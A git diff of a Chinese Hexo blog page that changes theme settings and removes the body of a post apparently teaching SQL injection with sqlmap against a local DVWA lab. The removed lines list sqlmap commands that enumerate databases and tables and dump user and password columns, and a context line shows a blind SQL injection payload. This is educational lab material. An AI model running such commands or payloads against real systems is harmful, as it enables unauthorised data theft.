@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"kvmtnk.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"kvmtnk.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta property="og:type" content="website">
@@ -168,10 +168,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-08-21 17:15:28 / 修改时间：18:03:48" itemprop="dateCreated datePublished" datetime="2020-08-21T17:15:28+08:00">2020-08-21</time>
+              <time title="创建时间：2020-08-21 17:15:28" itemprop="dateCreated datePublished" datetime="2020-08-21T17:15:28+08:00">2020-08-21</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-23 15:44:07" itemprop="dateModified" datetime="2020-09-23T15:44:07+08:00">2020-09-23</time>
+              </span>
 
           
 
@@ -186,14 +192,15 @@
       
           <h1 id="利用sqlmap工具"><a href="#利用sqlmap工具" class="headerlink" title="利用sqlmap工具"></a>利用sqlmap工具</h1><p>  以DVWA为例<br>  首先在款内输入数字2，复制浏览器上的链接<a target="_blank" rel="noopener" href="http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#">http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#</a><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/1.jpg"></p>
 <p>   打开sqlmap工具<br>   <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</code><br>   -u 网址URL<br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/2.jpg"><br>   发现302重定向到了login.php,需要cookie信息</p>
-<p>   浏览器上按F12，复制cookie信息<br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/3.jpg"></p>
-<p>   继续输入<br>   <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot;</code><br>   成功！我们获取到了信息<br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/4.jpg"><br>   the back-end DBMS is MySQL                                //后台数据库管理系统：MySQL<br>   back-end DBMS: MySQL &gt;= 5.0                       //后台数据库：MySQL<br>   可以布尔型盲注，报错注入，延时盲注，联合查询</p>
-<h1 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h1><p>   –dbs  得到所有数据库<br>   输入<code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot; --dbs </code><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/5.jpg"></p>
-<p>   –current-db  当前数据库<br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/6.jpg"><br>   当前数据是dvwa</p>
-<h1 id="获取dvwa下的表"><a href="#获取dvwa下的表" class="headerlink" title="获取dvwa下的表"></a>获取dvwa下的表</h1><p>   –tables 表<br>   -D 数据库<br>   <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot; -D dvwa --tables</code><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/7.jpg"><br>   得到两张表</p>
-<h1 id="获取users表下的列"><a href="#获取users表下的列" class="headerlink" title="获取users表下的列"></a>获取users表下的列</h1><p>   –column 列<br>   -T 表<br>    <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot; -D dvwa -T users --column</code><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/8.jpg"></p>
-<h1 id="获取user，password信息并dump下来"><a href="#获取user，password信息并dump下来" class="headerlink" title="获取user，password信息并dump下来"></a>获取user，password信息并dump下来</h1><p>   –dump dump数据<br>   -C 列<br>   <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot; -D dvwa -T users -C password,user --dump</code><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/9.jpg"></p>
-
+<p>   浏览器上按F12，复制cookie信息<br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/3.jpg"><br></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -768,6 +775,16 @@ and ascii (substr((select user from dvwa.users limit 0,1),1,1))&gt;96 #
 </div>
 
 
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.dark5.net/" title="https:&#x2F;&#x2F;www.dark5.net&#x2F;" rel="noopener" target="_blank">5号黯区</a>
+        </li>
+    </ul>
+  </div>
 
       </div>
 
@@ -794,7 +811,7 @@ and ascii (substr((select user from dvwa.users limit 0,1),1,1))&gt;96 #
   </span>
   <span class="author" itemprop="copyrightHolder">Wyattt</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
 
         
